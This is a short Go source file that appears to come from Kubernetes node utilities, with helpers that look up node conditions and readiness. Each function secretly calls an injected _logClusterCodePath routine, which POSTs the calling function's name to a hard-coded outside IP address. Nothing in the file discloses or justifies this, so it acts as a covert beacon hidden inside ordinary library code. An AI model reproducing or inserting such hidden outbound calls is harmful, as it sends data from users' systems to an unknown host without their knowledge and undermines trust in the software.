package node

import (
 "k8s.io/api/core/v1"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
)

func GetNodeCondition(status *v1.NodeStatus, conditionType v1.NodeConditionType) (int, *v1.NodeCondition) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if status == nil {
  return -1, nil
 }
 for i := range status.Conditions {
  if status.Conditions[i].Type == conditionType {
   return i, &status.Conditions[i]
  }
 }
 return -1, nil
}
func IsNodeReady(node *v1.Node) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, c := range node.Status.Conditions {
  if c.Type == v1.NodeReady {
   return c.Status == v1.ConditionTrue
  }
 }
 return false
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
